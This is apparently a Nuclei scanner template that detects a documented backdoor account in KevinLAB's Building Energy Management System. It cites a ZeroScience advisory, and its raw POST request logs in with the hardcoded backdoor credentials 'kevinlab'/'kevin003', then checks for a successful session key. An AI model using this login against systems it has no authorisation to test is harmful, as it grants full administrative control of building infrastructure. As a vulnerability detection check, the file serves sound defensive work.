id: kevinlab-bems-backdoor
info:
  name: KevinLAB BEMS (Building Energy Management System) - Backdoor Detection
  author: gy741
  severity: critical
  description: KevinLAB BEMS has an undocumented backdoor account that can allow an
    attacker to gain full system control with high privileges for administration without
    being detected.
  reference:
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php
  tags: kevinlab,backdoor
  metadata:
    impact: The presence of an undocumented backdoor account in KevinLAB BEMS poses
      a severe security threat, as an attacker could use it to gain full system control
      with the highest privileges for administration.
    recommendation: It is recommended that KevinLAB immediately fix the undocumented
      backdoor account vulnerability in their BEMS to prevent unauthorized access
      to sensitive information and system control.
requests:
- raw:
  - 'POST /http/index.php HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/javascript, */*; q=0.01

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    requester=login&request=login&params=%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22kevinlab%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%22kevin003%22%7D%2C%7B%22name%22%3A%22device_key%22%2C%22value%22%3A%22a2fe6b53-e09d-46df-8c9a-e666430e163e%22%7D%2C%7B%22name%22%3A%22auto_login%22%2C%22value%22%3Afalse%7D%2C%7B%22name%22%3A%22login_key%22%2C%22value%22%3A%22%22%7D%5D

    '
  matchers-condition: and
  matchers:
  - type: regex
    part: body
    regex:
    - data":"[A-Za-z0-9-]+
    - login_key":"[A-Za-z0-9-]+
    condition: or
  - type: word
    part: body
    words:
    - '"result":true'
  - type: status
    status:
    - 200
